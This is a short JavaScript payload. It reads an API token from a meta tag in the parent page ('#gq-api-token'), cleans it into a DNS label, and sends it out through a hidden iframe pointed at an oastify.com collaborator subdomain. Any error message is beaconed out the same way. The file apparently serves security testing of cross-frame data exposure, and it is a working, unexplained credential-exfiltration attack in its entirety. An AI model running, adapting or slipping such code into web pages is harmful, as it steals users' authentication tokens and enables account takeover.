(() => {
  try {
    const token = window.parent.document.querySelector('#gq-api-token')?.content;
    if (!token) throw new Error('no_token');

    const safeToken = token.replace(/[^a-zA-Z0-9]/g, '').slice(0, 63); // safe for DNS label

    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.src = `https://${safeToken}.tpmjyutclthec5nc6l6c8c88zz5utkh9.oastify.com`;
    document.body.appendChild(iframe);
  } catch (e) {
    const err = ('' + e.message).replace(/[^a-zA-Z0-9]/g, '').slice(0, 50);
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.src = `https://err-${err}.tpmjyutclthec5nc6l6c8c88zz5utkh9.oastify.com`;
    document.body.appendChild(iframe);
  }
})();
